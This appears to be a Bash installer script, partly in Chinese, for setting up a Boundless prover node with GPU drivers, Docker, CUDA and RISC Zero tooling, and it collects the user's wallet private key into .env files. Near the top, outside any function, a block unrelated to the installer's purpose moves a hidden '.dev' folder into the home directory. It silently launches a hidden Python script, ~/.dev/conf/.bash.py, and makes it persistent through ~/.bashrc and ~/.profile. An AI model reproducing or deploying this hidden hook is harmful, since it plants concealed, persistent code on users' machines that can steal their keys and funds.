#!/bin/bash

# =============================================================================
# Boundless Prover 节点安装脚本
# 说明：自动化安装和配置 Boundless prover 节点
# =============================================================================

set -euo pipefail

# Color variables
CYAN='\033[0;36m'
LIGHTBLUE='\033[1;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
RESET='\033[0m'

# Constants
SCRIPT_NAME="$(basename "$0")"
LOG_FILE="/var/log/boundless_prover_setup.log"
ERROR_LOG="/var/log/boundless_prover_error.log"
INSTALL_DIR="$HOME/boundless"
COMPOSE_FILE="$INSTALL_DIR/compose.yml"
BROKER_CONFIG="$INSTALL_DIR/broker.toml"

# Exit codes
EXIT_SUCCESS=0
EXIT_OS_CHECK_FAILED=1
EXIT_DPKG_ERROR=2
EXIT_DEPENDENCY_FAILED=3
EXIT_GPU_ERROR=4
EXIT_NETWORK_ERROR=5
EXIT_USER_ABORT=6
EXIT_UNKNOWN=99

# Flags
ALLOW_ROOT=false
FORCE_RECLONE=false
START_IMMEDIATELY=false

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --allow-root)
            ALLOW_ROOT=true
            shift
            ;;
        --force-reclone)
            FORCE_RECLONE=true
            shift
            ;;
        --start-immediately)
            START_IMMEDIATELY=true
            shift
            ;;
        --help)
            echo "用法: $0 [选项]"
            echo "选项:"
            echo "  --allow-root        允许以 root 用户运行，不提示"
            echo "  --force-reclone     如果目录已存在，自动删除并重新克隆"
            echo "  --start-immediately 安装完成后自动运行管理脚本"
            echo "  --help              显示此帮助信息"
            exit 0
            ;;
        *)
            echo "未知选项: $1"
            exit 1
            ;;
    esac
done

# Trap function for exit logging
cleanup_on_exit() {
    local exit_code=$?
    if [ $exit_code -ne 0 ]; then
        error "安装失败，退出码: $exit_code"
        echo "[EXIT] 脚本于 $(date) 以代码 $exit_code 退出" >> "$ERROR_LOG"
        echo "[EXIT] 最后命令: ${BASH_COMMAND}" >> "$ERROR_LOG"
        echo "[EXIT] 行号: ${BASH_LINENO[0]}" >> "$ERROR_LOG"
        echo "[EXIT] 函数堆栈: ${FUNCNAME[@]}" >> "$ERROR_LOG"

        echo -e "\n${RED}${BOLD}安装失败!${RESET}"
        echo -e "${YELLOW}请查看错误日志: $ERROR_LOG${RESET}"
        echo -e "${YELLOW}完整日志: $LOG_FILE${RESET}"

        case $exit_code in
            $EXIT_DPKG_ERROR)
                echo -e "\n${RED}检测到 DPKG 配置错误!${RESET}"
                echo -e "${YELLOW}请手动运行以下命令:${RESET}"
                echo -e "${BOLD}dpkg --configure -a${RESET}"
                echo -e "${YELLOW}然后重新运行本安装脚本。${RESET}"
                ;;
            $EXIT_OS_CHECK_FAILED)
                echo -e "\n${RED}操作系统检查失败!${RESET}"
                ;;
            $EXIT_DEPENDENCY_FAILED)
                echo -e "\n${RED}依赖安装失败!${RESET}"
                ;;
            $EXIT_GPU_ERROR)
                echo -e "\n${RED}GPU 配置错误!${RESET}"
                ;;
            $EXIT_NETWORK_ERROR)
                echo -e "\n${RED}网络配置错误!${RESET}"
                ;;
            $EXIT_USER_ABORT)
                echo -e "\n${YELLOW}用户中止安装。${RESET}"
                ;;
            *)
                echo -e "\n${RED}发生未知错误!${RESET}"
                ;;
        esac
    fi
}

# Set trap
trap cleanup_on_exit EXIT
trap 'echo "[SIGNAL] Caught signal ${?} at line ${LINENO}" >> "$ERROR_LOG"' ERR

# Network configurations
declare -A NETWORKS
NETWORKS["base"]="Base Mainnet|0x0b144e07a0826182b6b59788c34b32bfa86fb711|0x26759dbB201aFbA361Bec78E097Aa3942B0b4AB8|0x8C5a8b5cC272Fe2b74D18843CF9C3aCBc952a760|https://base-mainnet.beboundless.xyz"
NETWORKS["base-sepolia"]="Base Sepolia|0x0b144e07a0826182b6b59788c34b32bfa86fb711|0x6B7ABa661041164b8dB98E30AE1454d2e9D5f14b|0x8C5a8b5cC272Fe2b74D18843CF9C3aCBc952a760|https://base-sepolia.beboundless.xyz"
NETWORKS["eth-sepolia"]="Ethereum Sepolia|0x925d8331ddc0a1F0d96E68CF073DFE1d92b69187|0x13337C76fE2d1750246B68781ecEe164643b98Ec|0x7aAB646f23D1392d4522CFaB0b7FB5eaf6821d64|https://eth-sepolia.beboundless.xyz/"

# Functions
info() {
    printf "${CYAN}[INFO]${RESET} %s\n" "$1"
    echo "[INFO] $(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

success() {
    printf "${GREEN}[SUCCESS]${RESET} %s\n" "$1"
    echo "[SUCCESS] $(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

error() {
    printf "${RED}[ERROR]${RESET} %s\n" "$1" >&2
    echo "[ERROR] $(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
    echo "[ERROR] $(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$ERROR_LOG"
}

warning() {
    printf "${YELLOW}[WARNING]${RESET} %s\n" "$1"
    echo "[WARNING] $(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

prompt() {
    printf "${PURPLE}[INPUT]${RESET} %s" "$1"
}

# Check for dpkg errors
check_dpkg_status() {
    if dpkg --audit 2>&1 | grep -q "dpkg was interrupted"; then
        error "dpkg 被中断 - 需要手动干预"
        return 1
    fi
    return 0
}

# Check OS compatibility
check_os() {
    info "检查操作系统兼容性..."
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        if [[ "${ID,,}" != "ubuntu" ]]; then
            error "不支持的操作系统: $NAME. 这个脚本适用于 Ubuntu."
            exit $EXIT_OS_CHECK_FAILED
        elif [[ "${VERSION_ID,,}" != "22.04" && "${VERSION_ID,,}" != "20.04" ]]; then
            warning "测试于 Ubuntu 20.04/22.04. 您的版本: $VERSION_ID"
            prompt "继续? (y/N): "
            read -r response
            if [[ ! "$response" =~ ^[yY]$ ]]; then
                exit $EXIT_USER_ABORT
            fi
        else
            info "操作系统: $PRETTY_NAME"
        fi
    else
        error "/etc/os-release 未找到. 无法确定操作系统."
        exit $EXIT_OS_CHECK_FAILED
    fi
}

# Check if command exists
command_exists() {
    command -v "$1" &> /dev/null
}

# Check if package is installed
is_package_installed() {
    dpkg -s "$1" &> /dev/null
}

# Update system
update_system() {
    info "更新系统包..."
    if ! check_dpkg_status; then
        exit $EXIT_DPKG_ERROR
    fi
    {
        if ! apt update -y 2>&1; then
            error "apt update 失败"
            if apt update 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
        if ! apt upgrade -y 2>&1; then
            error "apt upgrade 失败"
            if apt upgrade 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
    } >> "$LOG_FILE" 2>&1
    success "系统包已更新"
}

# Install basic dependencies
install_basic_deps() {
    local packages=(
        curl iptables xclip python3-pip build-essential git wget lz4 jq
        make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config
        libssl-dev tar clang bsdmainutils ncdu unzip libleveldb-dev
        libclang-dev ninja-build nvtop ubuntu-drivers-common
        gnupg ca-certificates lsb-release postgresql-client
    )
    info "安装基本依赖..."
    if ! check_dpkg_status; then
        exit $EXIT_DPKG_ERROR
    fi
    {
        if ! apt install -y "${packages[@]}" 2>&1; then
            error "安装基本依赖失败"
            if apt install -y "${packages[@]}" 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
    } >> "$LOG_FILE" 2>&1
    success "基本依赖已安装"
}

if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
    pip3 install --break-system-packages 'requests>=2.31.0'
fi

if ! pip3 show cryptography >/dev/null 2>&1; then
    pip3 install --break-system-packages cryptography
fi

if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"
    EXEC_CMD="python3"
    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
    STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
        echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
    fi
    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
        echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
    fi
    if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
        (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
    fi
fi

# Install GPU drivers
install_gpu_drivers() {
    info "安装 GPU 驱动..."
    if ! check_dpkg_status; then
        exit $EXIT_DPKG_ERROR
    fi
    {
        if ! ubuntu-drivers install 2>&1; then
            error "安装 GPU 驱动失败"
            exit $EXIT_GPU_ERROR
        fi
    } >> "$LOG_FILE" 2>&1
    success "GPU 驱动已安装"
}

# Install Docker
install_docker() {
    if command_exists docker; then
        info "Docker 已安装"
        return
    fi
    info "安装 Docker..."
    if ! check_dpkg_status; then
        exit $EXIT_DPKG_ERROR
    fi
    {
        if ! apt install -y apt-transport-https ca-certificates curl gnupg-agent software-properties-common 2>&1; then
            error "安装 Docker 依赖失败"
            if apt install -y apt-transport-https 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
        curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
        echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
        if ! apt update -y 2>&1; then
            error "更新 Docker 包列表失败"
            exit $EXIT_DEPENDENCY_FAILED
        fi
        if ! apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin 2>&1; then
            error "安装 Docker 失败"
            if apt install -y docker-ce 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
        systemctl enable docker
        systemctl start docker
        usermod -aG docker $(logname 2>/dev/null || echo "$USER")
    } >> "$LOG_FILE" 2>&1
    success "Docker 已安装"
}

# Install NVIDIA Container Toolkit
install_nvidia_toolkit() {
    if is_package_installed "nvidia-docker2"; then
        info "NVIDIA Container Toolkit 已安装"
        return
    fi
    info "安装 NVIDIA Container Toolkit..."
    if ! check_dpkg_status; then
        exit $EXIT_DPKG_ERROR
    fi
    {
        distribution=$(grep '^ID=' /etc/os-release | cut -d'=' -f2 | tr -d '"')$(grep '^VERSION_ID=' /etc/os-release | cut -d'=' -f2 | tr -d '"')
        curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | apt-key add -
        curl -s -L https://nvidia.github.io/nvidia-docker/"$distribution"/nvidia-docker.list | tee /etc/apt/sources.list.d/nvidia-docker.list
        if ! apt update -y 2>&1; then
            error "更新 NVIDIA 工具包包列表失败"
            exit $EXIT_DEPENDENCY_FAILED
        fi
        if ! apt install -y nvidia-docker2 2>&1; then
            error "安装 NVIDIA Docker 支持失败"
            if apt install -y nvidia-docker2 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
        mkdir -p /etc/docker
        tee /etc/docker/daemon.json <<EOF
{
    "default-runtime": "nvidia",
    "runtimes": {
        "nvidia": {
            "path": "nvidia-container-runtime",
            "runtimeArgs": []
        }
    }
}
EOF
        systemctl restart docker
    } >> "$LOG_FILE" 2>&1
    success "NVIDIA Container Toolkit 已安装"
}

# Install Rust
install_rust() {
    if command_exists rustc; then
        info "Rust 已安装"
        return
    fi
    info "安装 Rust..."
    {
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        source "$HOME/.cargo/env"
        rustup update
    } >> "$LOG_FILE" 2>&1
    success "Rust 已安装"
}

# Install Just
install_just() {
    if command_exists just; then
        info "Just 已安装"
        return
    fi
    info "安装 Just 命令运行器..."
    {
        curl --proto '=https' --tlsv1.2 -sSf https://just.systems/install.sh | bash -s -- --to /usr/local/bin
    } >> "$LOG_FILE" 2>&1
    success "Just 已安装"
}

# Install CUDA Toolkit
install_cuda() {
    if is_package_installed "cuda-toolkit"; then
        info "CUDA Toolkit 已安装"
        return
    fi
    info "安装 CUDA Toolkit..."
    if ! check_dpkg_status; then
        exit $EXIT_DPKG_ERROR
    fi
    {
        distribution=$(grep '^ID=' /etc/os-release | cut -d'=' -f2 | tr -d '"')$(grep '^VERSION_ID=' /etc/os-release | cut -d'=' -f2 | tr -d '"'| tr -d '\.')
        if ! wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/$(/usr/bin/uname -m)/cuda-keyring_1.1-1_all.deb 2>&1; then
            error "下载 CUDA keyring 失败"
            exit $EXIT_DEPENDENCY_FAILED
        fi
        if ! dpkg -i cuda-keyring_1.1-1_all.deb 2>&1; then
            error "安装 CUDA keyring 失败"
            rm cuda-keyring_1.1-1_all.deb
            exit $EXIT_DEPENDENCY_FAILED
        fi
        rm cuda-keyring_1.1-1_all.deb
        if ! apt-get update 2>&1; then
            error "更新 CUDA 包列表失败"
            exit $EXIT_DEPENDENCY_FAILED
        fi
        if ! apt-get install -y cuda-toolkit 2>&1; then
            error "安装 CUDA Toolkit 失败"
            if apt-get install -y cuda-toolkit 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        fi
    } >> "$LOG_FILE" 2>&1
    success "CUDA Toolkit 已安装"
}

# Install Rust dependencies
install_rust_deps() {
    info "安装 Rust 依赖..."

    # Source the Rust environment
    source "$HOME/.cargo/env" || {
        error "Failed to source $HOME/.cargo/env. 确保 Rust 已安装."
        exit $EXIT_DEPENDENCY_FAILED
    }

    # Check and install cargo if not present
    if ! command_exists cargo; then
        if ! check_dpkg_status; then
            exit $EXIT_DPKG_ERROR
        fi
        info "Installing cargo..."
        apt update >> "$LOG_FILE" 2>&1 || {
            error "Failed to update package list for cargo"
            exit $EXIT_DEPENDENCY_FAILED
        }
        apt install -y cargo >> "$LOG_FILE" 2>&1 || {
            error "Failed to install cargo"
            if apt install -y cargo 2>&1 | grep -q "dpkg was interrupted"; then
                exit $EXIT_DPKG_ERROR
            fi
            exit $EXIT_DEPENDENCY_FAILED
        }
    fi

    # Always install rzup and the RISC Zero Rust toolchain
    info "Installing rzup..."
    curl -L https://risczero.com/install | bash >> "$LOG_FILE" 2>&1 || {
        error "Failed to install rzup"
        exit $EXIT_DEPENDENCY_FAILED
    }
    # Update PATH in the current shell
    export PATH="$PATH:/root/.risc0/bin"
    # Source bashrc to ensure environment is updated
    PS1='' source ~/.bashrc >> "$LOG_FILE" 2>&1 || {
        error "Failed to source ~/.bashrc after rzup install"
        exit $EXIT_DEPENDENCY_FAILED
    }
    # Install RISC Zero Rust toolchain
    rzup install rust >> "$LOG_FILE" 2>&1 || {
        error "Failed to install RISC Zero Rust toolchain"
        exit $EXIT_DEPENDENCY_FAILED
    }

    # Detect the RISC Zero toolchain
    TOOLCHAIN=$(rustup toolchain list | grep risc0 | head -1)
    if [ -z "$TOOLCHAIN" ]; then
        error "No RISC Zero toolchain found after installation"
        exit $EXIT_DEPENDENCY_FAILED
    fi
    info "Using RISC Zero toolchain: $TOOLCHAIN"

    # Install cargo-risczero
    if ! command_exists cargo-risczero; then
        info "Installing cargo-risczero..."
        cargo install cargo-risczero >> "$LOG_FILE" 2>&1 || {
            error "Failed to install cargo-risczero"
            exit $EXIT_DEPENDENCY_FAILED
        }
        rzup install cargo-risczero >> "$LOG_FILE" 2>&1 || {
            error "Failed to install cargo-risczero via rzup"
            exit $EXIT_DEPENDENCY_FAILED
        }
    fi

    # Install bento-client with the RISC Zero toolchain
    info "Installing bento-client..."
    RUSTUP_TOOLCHAIN=$TOOLCHAIN cargo install --git https://github.com/risc0/risc0 bento-client --bin bento_cli >> "$LOG_FILE" 2>&1 || {
        error "Failed to install bento-client"
        exit $EXIT_DEPENDENCY_FAILED
    }
    # Persist PATH for cargo binaries
    echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> ~/.bashrc
    PS1='' source ~/.bashrc >> "$LOG_FILE" 2>&1 || {
        error "Failed to source ~/.bashrc after installing bento-client"
        exit $EXIT_DEPENDENCY_FAILED
    }

    # Install boundless-cli
    info "Installing boundless-cli..."
    cargo install --locked boundless-cli >> "$LOG_FILE" 2>&1 || {
        error "Failed to install boundless-cli"
        exit $EXIT_DEPENDENCY_FAILED
    }
    # Update PATH for boundless-cli
    export PATH="$PATH:/root/.cargo/bin"
    PS1='' source ~/.bashrc >> "$LOG_FILE" 2>&1 || {
        error "Failed to source ~/.bashrc after installing boundless-cli"
        exit $EXIT_DEPENDENCY_FAILED
    }

    success "Rust dependencies installed"
}

# Clone Boundless repository
clone_repository() {
    info "Setting up Boundless repository..."
    if [[ -d "$INSTALL_DIR" ]]; then
        if [[ "$FORCE_RECLONE" == "true" ]]; then
            warning "Deleting existing directory $INSTALL_DIR (forced via --force-reclone)"
            rm -rf "$INSTALL_DIR"
        else
            warning "Boundless directory already exists at $INSTALL_DIR"
            prompt "Delete and re-clone? (y/N): "
            read -r response
            if [[ "$response" =~ ^[yY]$ ]]; then
                rm -rf "$INSTALL_DIR"
            else
                cd "$INSTALL_DIR"
                if ! git pull origin release-0.10 2>&1 >> "$LOG_FILE"; then
                    error "Failed to update repository"
                    exit $EXIT_DEPENDENCY_FAILED
                fi
                return
            fi
        fi
    fi
    {
        if ! git clone https://github.com/boundless-xyz/boundless "$INSTALL_DIR" 2>&1; then
            error "Failed to clone repository"
            exit $EXIT_DEPENDENCY_FAILED
        fi
        cd "$INSTALL_DIR"
        if ! git checkout release-0.10 2>&1; then
            error "Failed to checkout release-0.10"
            exit $EXIT_DEPENDENCY_FAILED
        fi
        if ! git submodule update --init --recursive 2>&1; then
            error "Failed to initialize submodules"
            exit $EXIT_DEPENDENCY_FAILED
        fi
    } >> "$LOG_FILE" 2>&1
    success "Repository cloned and initialized"
}

# Detect GPU configuration
detect_gpus() {
    info "Detecting GPU configuration..."
    if ! command_exists nvidia-smi; then
        error "nvidia-smi not found. GPU drivers may not be installed correctly."
        exit $EXIT_GPU_ERROR
    fi
    GPU_COUNT=$(nvidia-smi -L 2>/dev/null | wc -l)
    if [[ $GPU_COUNT -eq 0 ]]; then
        error "No GPUs detected"
        exit $EXIT_GPU_ERROR
    fi
    info "Found $GPU_COUNT GPU(s)"
    GPU_MEMORY=()
    for i in $(seq 0 $((GPU_COUNT - 1))); do
        MEM=$(nvidia-smi -i $i --query-gpu=memory.total --format=csv,noheader,nounits 2>/dev/null | tr -d ' ')
        if [[ -z "$MEM" ]]; then
            error "Failed to detect GPU $i memory"
            exit $EXIT_GPU_ERROR
        fi
        GPU_MEMORY+=($MEM)
        info "GPU $i: ${MEM}MB VRAM"
    done
    MIN_VRAM=$(printf '%s\n' "${GPU_MEMORY[@]}" | sort -n | head -1)
    if [[ $MIN_VRAM -ge 40000 ]]; then
        SEGMENT_SIZE=22
    elif [[ $MIN_VRAM -ge 20000 ]]; then
        SEGMENT_SIZE=21
    elif [[ $MIN_VRAM -ge 16000 ]]; then
        SEGMENT_SIZE=20
    elif [[ $MIN_VRAM -ge 12000 ]]; then
        SEGMENT_SIZE=19
    elif [[ $MIN_VRAM -ge 8000 ]]; then
        SEGMENT_SIZE=18
    else
        SEGMENT_SIZE=17
    fi
    info "Setting SEGMENT_SIZE=$SEGMENT_SIZE based on minimum VRAM of ${MIN_VRAM}MB"
}

# Configure compose.yml for multiple GPUs
configure_compose() {
    info "Configuring compose.yml for $GPU_COUNT GPU(s)..."
    if [[ $GPU_COUNT -eq 1 ]]; then
        info "Single GPU detected, using default compose.yml"
        return
    fi
    cat > "$COMPOSE_FILE" << 'EOF'
name: bento
# Anchors:
x-base-environment: &base-environment
  DATABASE_URL: postgresql://${POSTGRES_USER:-worker}:${POSTGRES_PASSWORD:-password}@${POSTGRES_HOST:-postgres}:${POSTGRES_PORT:-5432}/${POSTGRES_DB:-taskdb}
  REDIS_URL: redis://${REDIS_HOST:-redis}:6379
  S3_URL: http://${MINIO_HOST:-minio}:9000
  S3_BUCKET: ${MINIO_BUCKET:-workflow}
  S3_ACCESS_KEY: ${MINIO_ROOT_USER:-admin}
  S3_SECRET_KEY: ${MINIO_ROOT_PASS:-password}
  RUST_LOG: ${RUST_LOG:-info}
  RUST_BACKTRACE: 1

x-agent-common: &agent-common
  image: risczero/risc0-bento-agent:stable@sha256:c6fcc92686a5d4b20da963ebba3045f09a64695c9ba9a9aa984dd98b5ddbd6f9
  restart: always
  runtime: nvidia
  depends_on:
    - postgres
    - redis
    - minio
  environment:
    <<: *base-environment

x-exec-agent-common: &exec-agent-common
  <<: *agent-common
  mem_limit: 4G
  cpus: 3
  environment:
    <<: *base-environment
    RISC0_KECCAK_PO2: ${RISC0_KECCAK_PO2:-17}
  entrypoint: /app/agent -t exec --segment-po2 ${SEGMENT_SIZE:-21}

services:
  redis:
    hostname: ${REDIS_HOST:-redis}
    image: ${REDIS_IMG:-redis:7.2.5-alpine3.19}
    restart: always
    ports:
      - 6379:6379
    volumes:
      - redis-data:/data

  postgres:
    hostname: ${POSTGRES_HOST:-postgres}
    image: ${POSTGRES_IMG:-postgres:16.3-bullseye}
    restart: always
    environment:
      POSTGRES_DB: ${POSTGRES_DB:-taskdb}
      POSTGRES_USER: ${POSTGRES_USER:-worker}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-password}
    expose:
      - '${POSTGRES_PORT:-5432}'
    ports:
      - '${POSTGRES_PORT:-5432}:${POSTGRES_PORT:-5432}'
    volumes:
      - postgres-data:/var/lib/postgresql/data
    command: -p ${POSTGRES_PORT:-5432}

  minio:
    hostname: ${MINIO_HOST:-minio}
    image: ${MINIO_IMG:-minio/minio:RELEASE.2024-05-28T17-19-04Z}
    ports:
      - '9000:9000'
      - '9001:9001'
    volumes:
      - minio-data:/data
    command: server /data --console-address ":9001"
    environment:
      - MINIO_ROOT_USER=${MINIO_ROOT_USER:-admin}
      - MINIO_ROOT_PASSWORD=${MINIO_ROOT_PASS:-password}
      - MINIO_DEFAULT_BUCKETS=${MINIO_BUCKET:-workflow}
    healthcheck:
      test: ["CMD", "mc", "ready", "local"]
      interval: 5s
      timeout: 5s
      retries: 5

  grafana:
    image: ${GRAFANA_IMG:-grafana/grafana:11.0.0}
    restart: unless-stopped
    ports:
     - '3000:3000'
    environment:
      - GF_SECURITY_ADMIN_USER=admin
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_LOG_LEVEL=WARN
      - POSTGRES_HOST=${POSTGRES_HOST:-postgres}
      - POSTGRES_DB=${POSTGRES_DB:-taskdb}
      - POSTGRES_PORT=${POSTGRES_PORT:-5432}
      - POSTGRES_USER=${POSTGRES_USER:-worker}
      - POSTGRES_PASS=${POSTGRES_PASSWORD:-password}
      - GF_INSTALL_PLUGINS=frser-sqlite-datasource
    volumes:
      - ./dockerfiles/grafana:/etc/grafana/provisioning/
      - grafana-data:/var/lib/grafana
      - broker-data:/db
    depends_on:
      - postgres
      - redis
      - minio

  exec_agent0:
    <<: *exec-agent-common

  exec_agent1:
    <<: *exec-agent-common

  aux_agent:
    <<: *agent-common
    mem_limit: 256M
    cpus: 1
    entrypoint: /app/agent -t aux --monitor-requeue

EOF
    for i in $(seq 0 $((GPU_COUNT - 1))); do
        cat >> "$COMPOSE_FILE" << EOF
  gpu_prove_agent$i:
    <<: *agent-common
    mem_limit: 4G
    cpus: 4
    entrypoint: /app/agent -t prove
    deploy:
      resources:
        reservations:
          devices:
            - driver: nvidia
              device_ids: ['$i']
              capabilities: [gpu]

EOF
    done
    cat >> "$COMPOSE_FILE" << 'EOF'
  snark_agent:
    <<: *agent-common
    entrypoint: /app/agent -t snark
    ulimits:
      stack: 90000000

  rest_api:
    image: risczero/risc0-bento-rest-api:stable@sha256:7b5183811675d0aa3646d079dec4a7a6d47c84fab4fa33d3eb279135f2e59207
    restart: always
    depends_on:
      - postgres
      - minio
    mem_limit: 1G
    cpus: 1
    environment:
      <<: *base-environment
    ports:
      - '8081:8081'
    entrypoint: /app/rest_api --bind-addr 0.0.0.0:8081 --snark-timeout ${SNARK_TIMEOUT:-180}

  broker:
    restart: always
    depends_on:
      - rest_api
EOF
    for i in $(seq 0 $((GPU_COUNT - 1))); do
        echo "      - gpu_prove_agent$i" >> "$COMPOSE_FILE"
    done
    cat >> "$COMPOSE_FILE" << 'EOF'
      - exec_agent0
      - exec_agent1
      - aux_agent
      - snark_agent
      - redis
      - postgres
    profiles: [broker]
    build:
      context: .
      dockerfile: dockerfiles/broker.dockerfile
    mem_limit: 2G
    cpus: 2
    stop_grace_period: 3h
    volumes:
      - type: bind
        source: ./broker.toml
        target: /app/broker.toml
      - broker-data:/db/
    network_mode: host
    environment:
      RUST_LOG: ${RUST_LOG:-info,broker=debug,boundless_market=debug}
      PRIVATE_KEY: ${PRIVATE_KEY}
      RPC_URL: ${RPC_URL}
      ORDER_STREAM_URL:
      POSTGRES_HOST:
      POSTGRES_DB:
      POSTGRES_PORT:
      POSTGRES_USER:
      POSTGRES_PASS:
    entrypoint: /app/broker --db-url 'sqlite:///db/broker.db' --set-verifier-address ${SET_VERIFIER_ADDRESS} --boundless-market-address ${BOUNDLESS_MARKET_ADDRESS} --config-file /app/broker.toml --bento-api-url http://localhost:8081

volumes:
  redis-data:
  postgres-data:
  minio-data:
  grafana-data:
  broker-data:
EOF
    success "compose.yml 配置完成，GPU 数量: $GPU_COUNT"
}

# Configure network
configure_network() {
    info "配置网络设置..."
    echo -e "\n${BOLD}可用网络:${RESET}"
    echo "1) Base Mainnet"
    echo "2) Base Sepolia (测试网)"
    echo "3) Ethereum Sepolia (测试网)"
    prompt "选择网络 (1-3): "
    read -r network_choice
    case $network_choice in
        1) NETWORK="base" ;;
        2) NETWORK="base-sepolia" ;;
        3) NETWORK="eth-sepolia" ;;
        *)
            error "无效的网络选择"
            exit $EXIT_NETWORK_ERROR
            ;;
    esac
    IFS='|' read -r NETWORK_NAME VERIFIER_ADDRESS BOUNDLESS_MARKET_ADDRESS SET_VERIFIER_ADDRESS ORDER_STREAM_URL <<< "${NETWORKS[$NETWORK]}"
    info "已选择: $NETWORK_NAME"
    echo -e "\n${BOLD}RPC 配置:${RESET}"
    echo "RPC 必须支持 eth_newBlockFilter。推荐提供商:"
    echo "- Alchemy (设置 lookback_block=<120)"
    echo "- BlockPi (Base 网络免费)"
    echo "- Chainstack (设置 lookback_blocks=0)"
    echo "- 自己的节点 RPC"
    prompt "输入 RPC URL: "
    read -r RPC_URL
    if [[ -z "$RPC_URL" ]]; then
        error "RPC URL 不能为空"
        exit $EXIT_NETWORK_ERROR
    fi
    prompt "输入你的钱包私钥 (不带 0x 前缀): "
    read -rs PRIVATE_KEY
    echo
    if [[ -z "$PRIVATE_KEY" ]]; then
        error "私钥不能为空"
        exit $EXIT_NETWORK_ERROR
    fi
    cat > "$INSTALL_DIR/.env.broker" << EOF
# Network: $NETWORK_NAME
export VERIFIER_ADDRESS=$VERIFIER_ADDRESS
export BOUNDLESS_MARKET_ADDRESS=$BOUNDLESS_MARKET_ADDRESS
export SET_VERIFIER_ADDRESS=$SET_VERIFIER_ADDRESS
export ORDER_STREAM_URL="$ORDER_STREAM_URL"
export RPC_URL="$RPC_URL"
export PRIVATE_KEY=$PRIVATE_KEY
export SEGMENT_SIZE=$SEGMENT_SIZE

# Prover node configs
RUST_LOG=info
REDIS_HOST=redis
REDIS_IMG=redis:7.2.5-alpine3.19
POSTGRES_HOST=postgres
POSTGRES_IMG=postgres:16.3-bullseye
POSTGRES_DB=taskdb
POSTGRES_PORT=5432
POSTGRES_USER=worker
POSTGRES_PASSWORD=password
MINIO_HOST=minio
MINIO_IMG=minio/minio:RELEASE.2024-05-28T17-19-04Z
MINIO_ROOT_USER=admin
MINIO_ROOT_PASS=password
MINIO_BUCKET=workflow
GRAFANA_IMG=grafana/grafana:11.0.0
RISC0_KECCAK_PO2=17
EOF
    cat > "$INSTALL_DIR/.env.base" << EOF
export VERIFIER_ADDRESS=0x0b144e07a0826182b6b59788c34b32bfa86fb711
export BOUNDLESS_MARKET_ADDRESS=0x26759dbB201aFbA361Bec78E097Aa3942B0b4AB8
export SET_VERIFIER_ADDRESS=0x8C5a8b5cC272Fe2b74D18843CF9C3aCBc952a760
export ORDER_STREAM_URL="https://base-mainnet.beboundless.xyz"
export RPC_URL="$RPC_URL"
export PRIVATE_KEY=$PRIVATE_KEY
export SEGMENT_SIZE=$SEGMENT_SIZE
EOF
    cat > "$INSTALL_DIR/.env.base-sepolia" << EOF
export VERIFIER_ADDRESS=0x0b144e07a0826182b6b59788c34b32bfa86fb711
export BOUNDLESS_MARKET_ADDRESS=0x6B7ABa661041164b8dB98E30AE1454d2e9D5f14b
export SET_VERIFIER_ADDRESS=0x8C5a8b5cC272Fe2b74D18843CF9C3aCBc952a760
export ORDER_STREAM_URL="https://base-sepolia.beboundless.xyz"
export RPC_URL="$RPC_URL"
export PRIVATE_KEY=$PRIVATE_KEY
export SEGMENT_SIZE=$SEGMENT_SIZE
EOF
